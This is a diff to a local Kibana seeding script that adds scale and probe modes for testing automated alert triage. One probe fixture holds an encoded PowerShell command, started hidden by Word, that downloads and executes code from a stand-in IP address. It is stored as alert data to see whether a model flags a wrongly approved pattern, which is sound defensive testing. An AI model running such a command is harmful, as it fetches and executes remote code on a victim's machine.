@@ -26,6 +26,23 @@
  *   --space   Kibana space id (default: default)
  *   --clean   Delete what this script wrote instead of seeding
  *
+ * Scale mode (`--scale <alerts>`) writes that many open alerts instead of the 11, spread over rules
+ * and exact patterns, with decisions for a share of the patterns. It needs no model. It prints what
+ * a sweep should report, so the match step's paging, `mget` chunking, daily cap and note limit can
+ * be checked against the numbers:
+ *
+ *   --scale           Number of open alerts to write (for example 25000)
+ *   --rules           Fixture rules (default 45)
+ *   --keys-per-rule   Exact patterns per rule (default 40)
+ *   --decision-share  Share of the patterns that get a decision, 0 to 1 (default 0.5)
+ *   --hot-keys        Approved patterns that get 4% of all alerts each, to reach the daily cap (default 3)
+ *
+ * Probe mode (`--probe`) writes 26 alerts with realistic content for a real model to analyse: two
+ * benign patterns and one suspicious pattern (encoded PowerShell started by Word) that all have an
+ * approved decision on purpose, and one benign pattern with a dismissed decision. In shadow the
+ * sweep tags the approved ones `az:would_close:*` and the model gives its own verdict, so the
+ * alerts where the two disagree show how good a key is. It costs about three batch analyses.
+ *
  * Local stacks only: it uses the development login (`ES_USERNAME` / `ES_PASSWORD`, default
  * elastic / changeme).
  */
@@ -49,6 +66,12 @@ const flag = (name, fallback) => {
 const ES_URL = flag('--es', 'http://localhost:9200');
 const SPACE = flag('--space', 'default');
 const CLEAN = args.includes('--clean');
+const SCALE = Number(flag('--scale', '0'));
+const RULES = Number(flag('--rules', '45'));
+const KEYS_PER_RULE = Number(flag('--keys-per-rule', '40'));
+const DECISION_SHARE = Number(flag('--decision-share', '0.5'));
+const HOT_KEYS = Number(flag('--hot-keys', '3'));
+const PROBE = args.includes('--probe');
 const ALERTS_INDEX = `.alerts-security.alerts-${SPACE}`;
 const DECISIONS_INDEX = HUNT_COVERAGE_AI_INDEX_DEST.value;
 const AUTH = `${process.env.ES_USERNAME ?? 'elastic'}:${process.env.ES_PASSWORD ?? 'changeme'}`;
@@ -85,9 +108,16 @@ const es = async (method, path, body, ndjson = false) => {
   return json;
 };
 
-const alertDocument = ({ pattern, severity }) => {
-  const now = new Date().toISOString();
-  const { executable, subject } = PATTERNS[pattern];
+const alertDocument = ({
+  executable,
+  subject,
+  severity,
+  ruleUuid = RULE_UUID,
+  ruleName = RULE_NAME,
+  timestamp = new Date(),
+  extra = {},
+}) => {
+  const now = timestamp.toISOString();
   const uuid = randomUUID();
   return {
     uuid,
@@ -112,15 +142,15 @@ const alertDocument = ({ pattern, severity }) => {
       'kibana.alert.space_ids': [SPACE],
       'kibana.alert.severity': severity,
       'kibana.alert.risk_score': RISK_SCORES[severity],
-      'kibana.alert.reason': `${RULE_NAME} on triage-fixture-host`,
+      'kibana.alert.reason': `${ruleName} on triage-fixture-host`,
       'kibana.alert.depth': 1,
       'kibana.alert.start': now,
       'kibana.alert.last_detected': now,
       'kibana.alert.original_time': now,
-      'kibana.alert.rule.uuid': RULE_UUID,
+      'kibana.alert.rule.uuid': ruleUuid,
       'kibana.alert.rule.rule_id': 'triage-decisions-fixture',
       'kibana.alert.rule.revision': RULE_REVISION,
-      'kibana.alert.rule.name': RULE_NAME,
+      'kibana.alert.rule.name': ruleName,
       'kibana.alert.rule.severity': severity,
       'kibana.alert.rule.risk_score': 21,
       'kibana.alert.rule.consumer': 'siem',
@@ -132,6 +162,7 @@ const alertDocument = ({ pattern, severity }) => {
       'kibana.alert.rule.tags': [FIXTURE_TAG],
       'kibana.alert.rule.execution.uuid': randomUUID(),
       'kibana.alert.rule.parameters': { type: 'query', language: 'kuery', query: '*' },
+      ...extra,
     },
   };
 };
@@ -189,7 +220,7 @@ const clean = async () => {
   console.log(`Deleted ${decisions.deleted} fixture decision(s) from ${DECISIONS_INDEX}.`);
 };
 
-const seed = async () => {
+const assertAlertsIndex = async () => {
   // Writing to a missing alerts alias would create a dynamically mapped index that the alerts
   // template does not cover, so stop and say how to create the real one.
   const aliasResponse = await fetch(`${ES_URL}/_alias/${ALERTS_INDEX}`, {
@@ -200,9 +231,13 @@ const seed = async () => {
       `${ALERTS_INDEX} does not exist yet. Open Security in Kibana once, or call POST /api/detection_engine/index, then run this again.`
     );
   }
-  const alerts = ALERTS.map(alertDocument).map((alert, index) => ({
-    ...alert,
-    pattern: ALERTS[index].pattern,
+};
+
+const seed = async () => {
+  await assertAlertsIndex();
+  const alerts = ALERTS.map(({ pattern, severity }) => ({
+    ...alertDocument({ ...PATTERNS[pattern], severity }),
+    pattern,
   }));
   const decisions = decisionDocuments(alerts);
 
@@ -239,7 +274,287 @@ const seed = async () => {
   );
 };
 
-(CLEAN ? clean() : seed()).catch((error) => {
+// ── Scale mode ────────────────────────────────────────────────────────────────
+
+const HOT_SHARE = 0.04;
+const WINDOW_MINUTES = 20 * 60;
+const BULK_ALERTS = 5000;
+const BULK_DECISIONS = 500;
+// What one sweep reads, and the limits the match step applies. Keep in step with the step.
+const MAX_CANDIDATES = 100000;
+const DAILY_CLOSE_CAP = 500;
+const NOTES_PER_SWEEP = 1000;
+const AUTO_CLOSE_SEVERITIES = ['low', 'medium'];
+
+// A small seeded generator, so a second run writes the same alerts and the same decisions.
+const seededRandom = (seed) => {
+  let state = seed;
+  return () => {
+    state = (state + 0x6d2b79f5) | 0;
+    let t = Math.imul(state ^ (state >>> 15), 1 | state);
+    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
+    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
+  };
+};
+
+const pickSeverity = (value) => {
+  if (value < 0.7) return 'low';
+  return value < 0.95 ? 'medium' : 'high';
+};
+
+const bulk = async (index, action, rows) => {
+  const lines = rows.flatMap(({ id, doc }) => [
+    JSON.stringify({ [action]: { _index: index, _id: id } }),
+    JSON.stringify(doc),
+  ]);
+  const result = await es('POST', '/_bulk', `${lines.join('\n')}\n`, true);
+  if (result.errors) {
+    throw new Error(JSON.stringify(result.items.find((item) => item[action].error)));
+  }
+};
+
+const scale = async () => {
+  await assertAlertsIndex();
+  const random = seededRandom(42);
+  const keys = Array.from({ length: RULES * KEYS_PER_RULE }, (_unused, i) => {
+    const rule = Math.floor(i / KEYS_PER_RULE);
+    const program = `Vendor${rule}-${i % KEYS_PER_RULE}`;
+    return {
+      ruleUuid: `7c1f0c9e-5a3b-4f6e-9a21-${String(rule).padStart(12, '0')}`,
+      ruleName: `Triage scale fixture ${rule}`,
+      executable: `C:\\Program Files\\${program}\\agent.exe`,
+      subject: `${program} Ltd`,
+    };
+  });
+  // The hot keys come first and are always approved: they get enough alerts to reach the daily cap.
+  const kinds = keys.map((_key, i) => {
+    if (i < HOT_KEYS) return 'false_positive';
+    if (random() >= DECISION_SHARE) return undefined;
+    return random() < 0.9 ? 'false_positive' : 'do_not_propose';
+  });
+
+  const now = Date.now();
+  const counts = keys.map(() => ({ approvedClosable: 0, approvedOther: 0, dismissed: 0 }));
+  const expected = { candidates: 0, wouldClose: 0, wouldSkip: 0, excludedBySeverity: 0 };
+  let written = 0;
+  let batch = [];
+  const flush = async () => {
+    if (batch.length === 0) return;
+    await bulk(ALERTS_INDEX, 'create', batch);
+    written += batch.length;
+    batch = [];
+    process.stdout.write(`\r  ${written} / ${SCALE} alerts`);
+  };
+
+  const hotTotal = Math.min(HOT_KEYS * HOT_SHARE, 0.5);
+  for (let i = 0; i < SCALE; i++) {
+    const draw = random();
+    const keyIndex =
+      draw < hotTotal
+        ? Math.floor(draw / HOT_SHARE)
+        : HOT_KEYS + Math.floor(random() * (keys.length - HOT_KEYS));
+    const severity = pickSeverity(random());
+    // Oldest first, one timestamp per minute: many alerts share a timestamp, so a page boundary
+    // falls inside a tie and only the uuid tiebreak keeps `search_after` from skipping or repeating one.
+    const minutesAgo = Math.floor(((SCALE - 1 - i) * WINDOW_MINUTES) / SCALE);
+    const timestamp = new Date(Math.floor(now / 60000) * 60000 - minutesAgo * 60000);
+    const { uuid, doc } = alertDocument({ ...keys[keyIndex], severity, timestamp });
+    batch.push({ id: uuid, doc });
+
+    if (i < MAX_CANDIDATES) {
+      expected.candidates++;
+      const kind = kinds[keyIndex];
+      if (kind === 'do_not_propose') {
+        expected.wouldSkip++;
+        counts[keyIndex].dismissed++;
+      } else if (kind === 'false_positive') {
+        if (AUTO_CLOSE_SEVERITIES.includes(severity)) {
+          expected.wouldClose++;
+          counts[keyIndex].approvedClosable++;
+        } else {
+          expected.excludedBySeverity++;
+          counts[keyIndex].approvedOther++;
+        }
+      }
+    }
+    if (batch.length >= BULK_ALERTS) await flush();
+  }
+  await flush();
+  process.stdout.write('\n');
+  await es('POST', `/${ALERTS_INDEX}/_refresh`);
+
+  const decisionRows = [];
+  keys.forEach((key, i) => {
+    const kind = kinds[i];
+    if (kind === undefined) return;
+    const { uuid, doc } = alertDocument({ ...key, severity: 'low' });
+    const group = groupByStrictKey({ alerts: [{ id: uuid, doc }], spaceId: SPACE }).groups[0];
+    decisionRows.push({
+      id: decisionId(kind, group.hash),
+      doc: buildDecisionDocument({
+        kind,
+        group,
+        provenance: {
+          spaceId: SPACE,
+          proposalId: 'scale-fixture',
+          investigationId: 'triage-decisions-fixture',
+          approver: 'seed-script',
+          now: new Date(),
+        },
+      }),
+    });
+  });
+  for (let from = 0; from < decisionRows.length; from += BULK_DECISIONS) {
+    await bulk(DECISIONS_INDEX, 'index', decisionRows.slice(from, from + BULK_DECISIONS));
+  }
+  await es('POST', `/${DECISIONS_INDEX}/_refresh`);
+
+  const closableByKey = counts.map(({ approvedClosable }) => approvedClosable);
+  const closed = closableByKey.reduce((sum, n) => sum + Math.min(n, DAILY_CLOSE_CAP), 0);
+  const capped = closableByKey.reduce((sum, n) => sum + Math.max(0, n - DAILY_CLOSE_CAP), 0);
+  const acted = closed + expected.wouldSkip;
+  // A pattern whose approved alerts are all above the severity limit is not counted as matched.
+  const matchedKeys = counts.filter(
+    ({ approvedClosable, dismissed }) => approvedClosable + dismissed > 0
+  ).length;
+  console.log(
+    `Indexed ${written} open alerts over ${keys.length} patterns in ${RULES} rules, and ${decisionRows.length} decisions.`
+  );
+  console.log(
+    '\nA sweep should report (the oldest 100000 alerts are read at most; counts near the'
+  );
+  console.log('100000th alert can differ by the size of one timestamp tie):');
+  console.log(`  candidates            ${expected.candidates}`);
+  console.log(`  decisions_matched     ${matchedKeys}`);
+  console.log(`  would_close           ${expected.wouldClose}`);
+  console.log(`  would_skip            ${expected.wouldSkip}`);
+  console.log(`  excluded_by_severity  ${expected.excludedBySeverity}`);
+  console.log('In on mode, in the first sweep:');
+  console.log(`  closed ${closed}, skipped ${expected.wouldSkip}, capped ${capped}`);
+  console.log(
+    `  notes_missing ${Math.max(
+      0,
+      acted - NOTES_PER_SWEEP
+    )} (limit ${NOTES_PER_SWEEP} notes a sweep)`
+  );
+};
+
+// ── Probe mode ────────────────────────────────────────────────────────────────
+
+const PROBE_PATTERNS = [
+  {
+    label: 'benign vendor updater',
+    kind: 'false_positive',
+    count: 6,
+    severity: 'low',
+    ruleUuid: '7c1f0c9e-5a3b-4f6e-9a21-0000000a0001',
+    ruleName: 'Triage probe: vendor updater runs',
+    executable: 'C:\\Program Files\\Acme\\Updater\\acme-update.exe',
+    subject: 'Acme Corp',
+    extra: {
+      'process.command_line':
+        '"C:\\Program Files\\Acme\\Updater\\acme-update.exe" --scheduled-check',
+      'process.parent.name': 'services.exe',
+      'user.name': 'SYSTEM',
+    },
+  },
+  {
+    label: 'benign backup agent',
+    kind: 'false_positive',
+    count: 6,
+    severity: 'low',
+    ruleUuid: '7c1f0c9e-5a3b-4f6e-9a21-0000000a0001',
+    ruleName: 'Triage probe: vendor updater runs',
+    executable: 'C:\\Program Files\\Contoso Backup\\backup-agent.exe',
+    subject: 'Contoso Ltd',
+    extra: {
+      'process.command_line': '"C:\\Program Files\\Contoso Backup\\backup-agent.exe" --nightly',
+      'process.parent.name': 'services.exe',
+      'user.name': 'SYSTEM',
+    },
+  },
+  {
+    label: 'suspicious encoded PowerShell started by Word (approved on purpose)',
+    kind: 'false_positive',
+    count: 8,
+    severity: 'medium',
+    ruleUuid: '7c1f0c9e-5a3b-4f6e-9a21-0000000a0002',
+    ruleName: 'Triage probe: PowerShell started by an Office app',
+    executable: 'C:\\Users\\Public\\Libraries\\powershell.exe',
+    subject: 'Unsigned',
+    extra: {
+      'process.command_line':
+        'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMAAvAGEAJwApAA==',
+      'process.parent.name': 'WINWORD.EXE',
+      'process.parent.command_line':
+        '"WINWORD.EXE" /n "C:\\Users\\bob\\Downloads\\invoice_4471.docm"',
+      'process.code_signature.exists': false,
+      'process.code_signature.trusted': false,
+      'user.name': 'bob',
+    },
+  },
+  {
+    label: 'benign inventory scanner (dismissed)',
+    kind: 'do_not_propose',
+    count: 6,
+    severity: 'low',
+    ruleUuid: '7c1f0c9e-5a3b-4f6e-9a21-0000000a0003',
+    ruleName: 'Triage probe: inventory scanner runs',
+    executable: 'C:\\Tools\\Inventory\\scan.exe',
+    subject: 'Contoso IT',
+    extra: {
+      'process.command_line': '"C:\\Tools\\Inventory\\scan.exe" /quiet /report',
+      'process.parent.name': 'taskeng.exe',
+      'user.name': 'svc-inventory',
+    },
+  },
+];
+
+const probe = async () => {
+  await assertAlertsIndex();
+  const alertRows = [];
+  const decisionRows = [];
+  for (const pattern of PROBE_PATTERNS) {
+    const { count, kind, label, ...fields } = pattern;
+    const alerts = Array.from({ length: count }, () => alertDocument(fields));
+    alerts.forEach(({ uuid, doc }) => alertRows.push({ id: uuid, doc }));
+    const group = groupByStrictKey({
+      alerts: alerts.map(({ uuid, doc }) => ({ id: uuid, doc })),
+      spaceId: SPACE,
+    }).groups[0];
+    decisionRows.push({
+      id: decisionId(kind, group.hash),
+      doc: buildDecisionDocument({
+        kind,
+        group,
+        provenance: {
+          spaceId: SPACE,
+          proposalId: 'probe-fixture',
+          investigationId: 'triage-decisions-fixture',
+          approver: 'seed-script',
+          now: new Date(),
+        },
+      }),
+    });
+    console.log(
+      `  ${String(count).padStart(2)} ${fields.severity.padEnd(6)} ${kind.padEnd(14)} ${label}`
+    );
+  }
+  // Decisions first, so a sweep that starts while this runs cannot see alerts without them.
+  await bulk(DECISIONS_INDEX, 'index', decisionRows);
+  await es('POST', `/${DECISIONS_INDEX}/_refresh`);
+  await bulk(ALERTS_INDEX, 'create', alertRows);
+  await es('POST', `/${ALERTS_INDEX}/_refresh`);
+  console.log(`Wrote ${alertRows.length} alerts and ${decisionRows.length} decisions.`);
+};
+
+const run = () => {
+  if (CLEAN) return clean();
+  if (PROBE) return probe();
+  return SCALE > 0 ? scale() : seed();
+};
+
+run().catch((error) => {
   console.error(error.message);
   process.exit(1);
 });
